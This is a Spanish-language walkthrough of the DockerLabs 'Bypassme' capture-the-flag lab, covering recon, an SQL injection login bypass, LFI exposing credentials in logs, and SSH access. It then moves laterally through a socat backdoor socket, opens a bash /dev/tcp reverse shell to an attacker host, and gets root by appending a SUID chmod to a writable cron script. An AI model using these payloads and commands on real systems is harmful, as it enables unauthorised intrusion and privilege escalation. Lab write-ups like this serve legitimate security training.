# Laboratorio Bypassme

## Descripción
Writeup del laboratorio **Bypassme** de DockerLabs - Dificultad: Easy

## Reconocimiento

### Inicialización del laboratorio
Inicializamos el laboratorio Bypassme con el comando:
```bash
./auto_deploy.sh bypassme.tar
```

### Escaneo de puertos
Realizamos un escaneo completo de puertos con nmap:

```bash
nmap 172.17.0.2 -sV -A -p-
```bash
nmap 172.17.0.2 -sV -A -p-
```

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-06 22:48 EDT
Nmap scan report for 172.17.0.2
Host is up (0.0000090s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 b4:a8:42:e7:2b:2f:7a:f9:50:bd:6d:31:8e:36:54:7b (ECDSA)
|_  256 c0:ff:28:31:a3:0b:1a:3d:c3:5f:83:1b:3c:44:28:32 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
| http-title: Login Panel
|_Requested resource was login.php
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-server-header: Apache/2.4.58 (Ubuntu)
MAC Address: 02:42:AC:11:00:02 (Unknown)
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, OpenWrt 21.02 (Linux 5.4), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.01 ms 172.17.0.2

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.06 seconds
```

### Resultados del escaneo
Vemos que los puertos **SSH (22)** y **HTTP (80)** están abiertos.

## Explotación Web

### Inyección SQL
Probamos inyección SQL revisando el repositorio de [SQL Injection Authentication Bypass Cheat Sheet](https://github.com/austinsonger/SQL-Injection-Authentication-Bypass-Cheat-Sheet).

En este caso usaremos:
```sql
test' or '1'='1' -- -
```

**Explicación:** Este payload construye una consulta INSEGURA donde se busca bypassear la autenticación con una consulta que siempre será verdadera, puesto que `'1'='1'` siempre será verdadera.

Esto es una inyección SQL no parametrizada, lo que significa que es efectiva cuando solo se concatena la query.

### Enumeración de directorios
A continuación usaremos `dirb` para enumerar las rutas ocultas:

```bash
dirb http://172.17.0.2/
```

```
-----------------
DIRB v2.22    
By The Dark Raver
-----------------

START_TIME: Sun Sep  7 00:50:21 2025
URL_BASE: http://172.17.0.2/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

                                            GENERATED WORDS: 4612              

---- Scanning URL: http://172.17.0.2/ ----
                                            + http://172.17.0.2/index.php (CODE:302|SIZE:0)
+ http://172.17.0.2/logs (CODE:403|SIZE:275)
+ http://172.17.0.2/server-status (CODE:403|SIZE:275)
                                                                            
-----------------
END_TIME: Sun Sep  7 00:50:21 2025
DOWNLOADED: 4612 - FOUND: 3
```

### Acceso a logs mediante LFI
Vemos la existencia de una carpeta de `logs`, lo cual podemos evaluar si existe un archivo `logs.txt`. Sin embargo, al probar `http://172.17.0.2/logs/logs.txt` vemos que tenemos acceso restringido.

Como alternativa, podemos darnos cuenta en el apartado de welcome que se acepta un parámetro `page` (`?page=welcome`) el cual podemos usar para acceder a `logs.txt` de la siguiente manera:

```
http://172.17.0.2/index.php?page=logs/logs.txt
```

Y veremos lo siguiente:

    [2024-03-29 12:04:12] ERROR: Login failed for user 'root' [2024-03-29 12:04:12] 
    DEBUG: Trying password 'YWRtaW4xMjM=' [2024-03-29 12:04:13] 
    ERROR: Login failed for user 'admin' [2024-03-29 12:04:14] 
    DEBUG: Trying password 'dGVzdDEyMw==' [2024-03-29 12:04:16] 
    ERROR: Login failed for user 'test' [2024-03-29 12:04:18] 
    DEBUG: Login failed from IP 10.10.14.8 [2024-03-29 12:04:19] 
    EBUG: Login failed from IP 10.10.14.9 [2024-03-29 12:04:20] 
    DEBUG: Login failed from IP 10.10.14.10 [2024-03-29 12:04:21] 
    DEBUG: Login failed from IP 10.10.14.11 [2024-03-29 12:04:22] 
    WARNING: Too many login attempts [2024-03-29 12:04:23] 
    ERROR: Login attempt for user 'albert' [2024-03-29 12:04:24] 
    DEBUG: Trying password 'NGxiM3J0MTIz' [2024-03-29 12:04:25] 
    SUCCESS: Auth success for user 'albert' [2024-03-29 12:04:26] 
    DEBUG: Session token issued: 38b2fdcbffe78b9989f3e [2024-03-29 12:04:27] 
    DEBUG: SSH connection established from 10.10.14.8 [2024-03-29 12:04:28] 
    DEBUG: User 'albert' added to sudo group [2024-03-29 12:04:29] 
    DEBUG: File accessed: /var/www/html/index.php?page=welcome [2024-03-29 12:04:30] 
    DEBUG: File accessed: /etc/passwd [2024-03-29 12:04:31] 
    DEBUG: File accessed: /var/log/auth.log [2024-03-29 12:04:32] 
    DEBUG: File accessed: /var/www/html/login.php [2024-03-29 12:04:33] 
    DEBUG: File accessed: /var/www/html/logs/logs.txt [2024-03-29 12:04:34] 
    WARNING: Potential exposure of file logs.txt [2024-03-29 12:04:35] 
    WARNING: logs.txt contains sensitive authentication data [2024-03-29 12:04:36] [!!!] 
    SECURITY ALERT: logs/logs.txt is PUBLICLY EXPOSED [2024-03-29 12:04:37] [!!!] Use this file with caution credentials may be compromised 

Al ver los logs podemos ver que hubo una autenticacion exitosa con un usuario "albert" con contrasenia "NGxiM3J0MTIz", el cual podriamos intentar acceder con SSH

    albert@172.17.0.2

Insertamos la contrasenia y logramos acceso a la terminal

    albert@172.17.0.2's password: 
    Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.12.38+kali-amd64 x86_64)

    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/pro

    This system has been minimized by removing packages and content that are
    not required on a system that users do not log into.

    To restore this content, you can run the 'unminimize' command.
    Last login: Thu May 22 13:43:28 2025 from 172.17.0.1
    albert@6c657e793f58:~$ 

Ahora vamos a escalar privilegios con un binario llamado pspy64 el cual descargaremos en la maquina host y nos lo pasaremos con un servidor de python3 y con la herramienta wget nos lo descargaremos en la maquina victima

    cd /usr/share/pspy ## Ruta en donde se encuentra el pspy en la maquina kali
    python3 -m http.server

    >>> Maquina Victima

    cd /tmp
    wget wget http://<ip maquina atacante>:8000/pspy64

Nos dara como resultado esto

    --2025-09-07 00:55:36--  http://<ip maquina atacante>:8000/pspy64
    Connecting to <ip maquina atacante>:8000... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 3518724 (3.4M) [application/octet-stream]
    Saving to: ‘pspy64’

    pspy64         0%       0  --.-KB/s          pspy64       100%   3.36M  --.-KB/s    in 0.001s  

Ahora vamos a ejecutarlo

    chmod +x pspy64
    ./pspy64

Nos dara como resultado

```
pspy - version: 1.2.1 - Commit SHA: kali

 ██▓███    ██████  ██▓███ ▓██   ██▓
▓██░  ██▒▒██    ▒ ▓██░  ██▒▒██  ██▒
▓██░ ██▓▒░ ▓██▄   ▓██░ ██▓▒ ▒██ ██░
▒██▄█▓▒ ▒  ▒   ██▒▒██▄█▓▒ ▒ ░ ▐██▓░
▒██▒ ░  ░▒██████▒▒▒██▒ ░  ░ ░ ██▒▓░
▒▓▒░ ░  ░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░  ██▒▒▒ 
░▒ ░     ░ ░▒  ░ ░░▒ ░     ▓██ ░▒░ 
░░       ░  ░  ░  ░░       ▒ ▒ ░░  
                 ░           ░ ░     
                             ░ ░     

Config: Printing events (colored=true): processes=true | file-system-events=false ||| Scanning for processes every 100ms and on inotify events ||| Watching directories: [/usr /tmp /etc /home /var /opt] (recursive) | [] (non-recursive)
Draining file system events due to startup...
done
2025/09/07 01:00:45 CMD: UID=1001  PID=1402   | ./pspy64                                  
2025/09/07 01:00:45 CMD: UID=1001  PID=677    | -bash                                     
2025/09/07 01:00:45 CMD: UID=1001  PID=676    | sshd: albert@pts/0                        
2025/09/07 01:00:45 CMD: UID=0     PID=665    | sshd: albert [priv]                       
2025/09/07 01:00:45 CMD: UID=33    PID=522    | /usr/sbin/apache2 -k start                
2025/09/07 01:00:45 CMD: UID=33    PID=508    | /usr/sbin/apache2 -k start                
2025/09/07 01:00:45 CMD: UID=33    PID=507    | /usr/sbin/apache2 -k start                
2025/09/07 01:00:45 CMD: UID=33    PID=503    | /usr/sbin/apache2 -k start                
2025/09/07 01:00:45 CMD: UID=33    PID=502    | /usr/sbin/apache2 -k start                
2025/09/07 01:00:45 CMD: UID=33    PID=495    | /usr/sbin/apache2 -k start                
2025/09/07 01:00:45 CMD: UID=33    PID=482    | /usr/sbin/apache2 -k start                
2025/09/07 01:00:45 CMD: UID=33    PID=475    | /usr/sbin/apache2 -k start                
2025/09/07 01:00:45 CMD: UID=33    PID=455    | /usr/sbin/apache2 -k start                
2025/09/07 01:00:45 CMD: UID=0     PID=57     | tail -f /dev/null                         
2025/09/07 01:00:45 CMD: UID=1002  PID=54     | socat UNIX-LISTEN:/home/conx/.cache/.sock,fork EXEC:/bin/bash                          
2025/09/07 01:00:45 CMD: UID=0     PID=50     | /usr/sbin/cron -P                         
2025/09/07 01:00:45 CMD: UID=0     PID=44     | sshd: /usr/sbin/sshd [listener] 0 of 10-100 startups                                   
2025/09/07 01:00:45 CMD: UID=33    PID=31     | /usr/sbin/apache2 -k start                
2025/09/07 01:00:45 CMD: UID=0     PID=24     | /usr/sbin/apache2 -k start                
2025/09/07 01:00:45 CMD: UID=0     PID=1      | /bin/bash /etc/.start_services  
```

### Análisis de procesos interesantes
Nos fijamos principalmente en esta línea:
```
2025/06/06 09:18:36 CMD: UID=1002  PID=54     | socat UNIX-LISTEN:/home/conx/.cache/.sock,fork EXEC:/bin/bash
```

Desmenuzándola:
- **socat:** herramienta de red muy potente para redirigir conexiones
- **UNIX-LISTEN:/home/conx/.cache/.sock,fork:**
  - **UNIX-LISTEN** → abre un socket UNIX en la ruta `/home/conx/.cache/.sock`
  - **fork** → cada conexión nueva crea un proceso hijo
- **EXEC:/bin/bash:** cuando alguien se conecta al socket, socat lanza un bash

Ese proceso está levantando un socket local (un archivo `.sock`) que, al conectarse, le da a quien acceda una shell interactiva (bash).

### Explotación del socket
Así que realizaremos lo siguiente:

```bash
ls -la /home/conx/.cache/.sock
```

El cual nos muestra:
```
srwxrw-rw- 1 conx conx 0 Sep  6 20:43 /home/conx/.cache/.sock
```

Podemos ver que tenemos los permisos necesarios al observar que todos tienen el permiso de read-write, así que haremos lo siguiente:

```bash
socat - UNIX-CONNECT:/home/conx/.cache/.sock
```

Este comando nos permite conectarnos al backdoor que deja abierto el socat listener, y así poder interactuar con el `/bin/bash` que está atado al socket.

Haciendo `whoami` confirmaremos que somos el usuario `conx`:
```bash
whoami
# conx
```

### Reverse Shell
Usaremos el siguiente comando:

**Máquina atacante:**
```bash
nc -lvnp <puerto>
```

**Máquina víctima:**
```bash
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

En donde lanzamos un bash en modo interactivo abriendo una conexión TCP hacia la máquina atacante en un puerto específico, y redirigimos stdout (1) y stderr (2) al socket TCP, y stdin (0) al mismo descriptor (conexión TCP), así que todo lo que escribamos en el listener se mandará como entrada al bash, y lo que el bash responda (salida/error) viaje de vuelta al listener.

Comprobamos que nos funcione:

```
nc -lvnp <puerto>
listening on [any] <puerto> ...
connect to [<ip_maquina_atacante>:] from (UNKNOWN) [172.17.0.2] 52918
bash: cannot set terminal process group (52): Inappropriate ioctl for device
bash: no job control in this shell
conx@6c657e793f58:~$ whoami 
whoami
conx
```

### Mejora del TTY
Seguimos con la sanitización de shell (TTY):

```bash
script /dev/null -c bash
```

Con esto ejecutamos una nueva instancia de bash bajo el comando script, lo que nos da un pseudo-terminal (pty) mínimo.

Luego le damos **Ctrl + Z** para suspender el proceso actual y volver a nuestro Netcat (nc).

Luego corremos el comando:
```bash
stty raw -echo; fg
```

Que enviará los datos sin procesar y sin mostrar lo que escribamos.

Luego, hacemos los siguientes comandos:
```bash
reset xterm
export TERM=xterm
export SHELL=/bin/bash
```

Para limpiar, reiniciar, exportar el tipo de terminal y forzar el shell principal de bash.

Si tenemos algún problema con la terminal podemos usar:
```bash
stty size
```

y

```bash
stty rows <ROWS> columns <COLUMNS>
```

para ajustar el tamaño de la terminal para que coincida con el host.

### Enumeración de tareas programadas
Ahora listaremos los crontabs, que es la lista de tareas programadas en Linux:

```bash
ls -la /etc/cron.d/
```

Veremos algo como esto:
```
total 24
drwxr-xr-x 2 root root 4096 May 21 13:58 .
drwxr-xr-x 1 root root 4096 Jun  6 08:59 ..
-rw-r--r-- 1 root root  102 Mar 30  2024 .placeholder
-rw-r--r-- 1 root root   43 May 21 01:36 backup-cron
-rw-r--r-- 1 root root  201 Apr  8  2024 e2scrub_all
-rw-r--r-- 1 root root  712 Jan 18  2024 php
```

Vemos uno que no es creado por defecto que sería:
```
-rw-r--r-- 1 root root   43 May 21 01:36 backup-cron
```

Veremos qué contiene:
```bash
cat /etc/cron.d/backup-cron
```

```
* * * * * root bash /var/backups/backup.sh
```

### Explotación del script de backup
Vemos que ejecuta un script `.sh`, así que veremos si podemos modificar ese script con los permisos que tenga:

```bash
ls -la /var/backups/backup.sh
```

```
-rw-rw-r-- 1 conx root 246 May 22 15:47 /var/backups/backup.sh
```

Vemos que sí podemos, así que haremos lo siguiente:

```bash
echo "chmod u+s /bin/bash" >> /var/backups/backup.sh
```

Luego de esto listamos los permisos de la bash para ver si se aplicó el SUID:

```bash
ls -la /bin/bash
```

```
-rwxr-xr-x 1 root root 1446024 Mar 31  2024 /bin/bash
```

Si funcionó correctamente, ahora por último ejecutaremos:

```bash
bash -p
```

Y podremos comprobar que somos root:

```bash
whoami
# root
```

## Conclusión

**Máquina completada exitosamente**

### Resumen de la explotación:
1. **Reconocimiento:** Escaneo de puertos con nmap
2. **Inyección SQL:** Bypass de autenticación con payload básico
3. **LFI:** Acceso a logs mediante inclusión de archivos locales
4. **Credenciales:** Extracción de credenciales del archivo de logs
5. **SSH:** Acceso inicial con credenciales encontradas
6. **Enumeración:** Uso de pspy64 para descubrir procesos internos
7. **Lateral movement:** Explotación de socket UNIX con socat
8. **Escalada:** Modificación de tarea cron para obtener SUID en bash
9. **Root:** Ejecución de bash con privilegios preservados

### Vulnerabilidades identificadas:
- Inyección SQL en panel de login
- Inclusión de archivos locales (LFI)
- Exposición de credenciales en logs
- Socket UNIX mal configurado
- Script de backup modificable por usuario no privilegiado

---

**Fecha:** 07 de Septiembre de 2025  
**Dificultad:** Easy  
**Plataforma:** DockerLabs
